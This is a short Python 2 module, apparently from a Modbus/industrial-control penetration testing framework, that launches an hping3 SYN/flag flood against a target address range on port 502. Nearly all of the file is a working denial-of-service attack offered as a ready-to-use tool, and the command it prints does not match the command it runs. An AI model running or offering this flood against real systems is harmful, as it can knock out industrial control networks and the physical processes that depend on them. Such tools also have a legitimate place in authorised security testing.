import os
import threading
import subprocess

from System.Core.Global import *
from System.Core.Colors import *
from System.Core.Modbus import *
from System.Lib import ipcalc

class Module:


	info = {
		'Name': 'Flooding Attack',
		'Author': ['@Danel'],
		'Description': ("Flooding Attack with Hping script"),

        }
	options = {
		'RHOSTS'	:[''		,True	,'The target address range or CIDR identifier'],
		'RPORT'		:[502		,False	,'The port number for modbus protocol'],
		'FLAG'	:['-S'	,True	,'Set the FLAG [-S,-F,-R,-P,-A,-U]'],
		'sIP'	:[''	,True	,'Source IP (--rand-source)'],
		'Threads'	:[1		,False	,'The number of concurrent threads'],
		'Output'	:[True		,False	,'The stdout save in output directory']
	}	
	output = ''

	def exploit(self):
			self.printLine('[+] Flooding Attack started:',bcolors.OKGREEN)
			print "hping3 %s -p %s %s --flood %s" %(self.options['FLAG'][0],self.options['RPORT'][0],self.options['sIP'][0],self.options['RHOSTS'][0])
			self.printLine('[-] Control + c to STOP',bcolors.WARNING)
	 		flood = os.system("/usr/sbin/hping3 %s -p %s  --flood %s" %(self.options['FLAG'][0],self.options['RPORT'][0],self.options['RHOSTS'][0]))
			#subprocess.Popen(["./hping.sh"],stdin=subprocess.None)

			

		

	def printLine(self,str,color):
		self.output += str + '\n'
		if(str.find('[+]') != -1):
			print str.replace('[+]',color + '[+]' + bcolors.ENDC)
		elif(str.find('[-]') != -1):
			print str.replace('[-]',color + '[+]' + bcolors.ENDC)
		else:
			print str

	
